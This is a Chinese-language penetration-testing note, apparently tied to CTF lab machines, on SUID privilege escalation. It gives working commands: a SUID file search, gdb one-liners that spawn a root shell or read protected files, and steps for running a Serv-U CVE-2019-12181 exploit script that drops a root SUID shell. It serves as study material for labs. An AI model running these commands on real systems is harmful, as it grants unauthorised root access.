# SUID 權限服務劫持 (suid)
本文件說明如何利用 SUID 權限進行本地特權提升，並以 Serv-U FTP Server 漏洞為例。

## 🔍 檢測本機 SUID 檔案
可以使用以下指令枚舉系統中所有具備 SUID 權限的二進位檔案：
```bash
find / -perm -u=s -type f 2>/dev/null
```

## 🔍 SUID 配合 GTFOBins 逃逸利用
GTFOBins 是一個精心策劃的 Unix 二進制檔案列表，這些檔案可用於繞過配置錯誤系統中的本地安全限制。
當某個系統二進位檔案被配置了不當的 `SUID` 權限（且擁有者為 `root`），普通使用者在執行它時會暫時獲得 root 特權。如果該二進位檔案包含執行指令或與環境互動的特質，即可利用 GTFOBins 的手段進行權限逃逸。

---

## 💥 gdb SUID 權限逃逸 (gdb)
若二進位檔案 `gdb` 被賦予了 `SUID` 權限，可以藉由其內建的 Python 支持環境直接執行特權的 Shell。常見利用命令如下：

### 1. 直接以特權模式啟動 Shell (更通用)
```bash
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```

### 2. 提升 RUID 後呼叫內建 Shell (免 -p)
透過 Python 將 RUID 設定為 0 (root)，繞過子 Shell 啟動時的自動降權防禦，再利用 GDB 的 `!` 呼叫系統 shell：
```bash
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
```

### 3. 讀取敏感檔案 (免 Shell)
由於 GDB 以 root 權限執行內建 Python 環境，因此能直接讀取普通使用者無權限讀取的敏感檔案（如 flag 或系統設定檔）：
```bash
gdb -nx -ex 'python print(open("/path/to/file").read())' -ex quit
```

---

## 💥 Serv-U FTP Server 本地提權 (serv-u-ftp-server)
*   **CVE 編號**：CVE-2019-12181 (適用於 Serv-U FTP Server < 15.1.7)
*   **利用方法**：
    透過本機資訊枚舉（如 `linpeas`）發現具有 SUID 屬性的 `/usr/local/Serv-U`，使用對應的 Exploits 本地利用程式：
    ```bash
    # 賦予 Exploits 腳本執行權限並運行
    chmod +x 47173.sh
    ./47173.sh
    ```
    執行成功後，將會自動釋放一個 root SUID Shell 位於 `/tmp/sh`，執行它即可獲得 `root` 權限。

---

# 實戰關聯
*   **靶機應用實例**：
    *   [[Election1]] (利用 SUID Serv-U FTP Server 溢出提權)
    *   [[Gaara]] (利用 SUID `gdb` 進行特權提升取得 root Shell)
